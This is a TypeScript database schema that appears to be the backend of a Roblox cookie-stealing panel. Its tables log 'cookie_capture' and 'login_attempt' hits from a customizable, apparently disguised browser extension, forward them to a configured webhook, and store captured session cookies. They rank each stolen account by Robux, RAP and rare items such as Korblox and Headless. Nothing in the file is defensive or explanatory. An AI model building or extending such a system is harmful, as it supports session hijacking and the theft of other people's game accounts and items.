import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, bigint, boolean } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 */
export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Configuration for extension and webhooks
 */
export const config = mysqlTable("config", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").notNull().unique(),
  webhookUrl: text("webhookUrl").notNull(),
  panelUrl: text("panelUrl"),
  extensionTitle: text("extensionTitle"),
  extensionDescription: text("extensionDescription"),
  extensionBackground: text("extensionBackground"),
  extensionPrimaryColor: varchar("extensionPrimaryColor", { length: 7 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Config = typeof config.$inferSelect;
export type InsertConfig = typeof config.$inferInsert;

/**
 * Hit events from extension
 */
export const hits = mysqlTable("hits", {
  id: int("id").autoincrement().primaryKey(),
  eventType: mysqlEnum("eventType", ["cookie_capture", "login_attempt", "extension_open", "click"]).notNull(),
  cookie: text("cookie"),
  userAgent: text("userAgent"),
  ipAddress: varchar("ipAddress", { length: 45 }),
  metadata: text("metadata"), // JSON string for additional data
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  userId: int("userId"),
});

export type Hit = typeof hits.$inferSelect;
export type InsertHit = typeof hits.$inferInsert;

/**
 * Captured accounts summary
 */
export const capturedAccounts = mysqlTable("captured_accounts", {
  id: int("id").autoincrement().primaryKey(),
  cookie: text("cookie").notNull(),
  capturedAt: timestamp("capturedAt").defaultNow().notNull(),
  lastUsedAt: timestamp("lastUsedAt"),
  isValid: boolean("isValid").default(true).notNull(),
  robux: int("robux").default(0),
  rap: int("rap").default(0),
  summary: int("summary").default(0),
  hasKorblox: boolean("hasKorblox").default(false),
  hasHeadless: boolean("hasHeadless").default(false),
  metadata: text("metadata"), // JSON string for account info
  userId: int("userId"),
});

export type CapturedAccount = typeof capturedAccounts.$inferSelect;
export type InsertCapturedAccount = typeof capturedAccounts.$inferInsert;
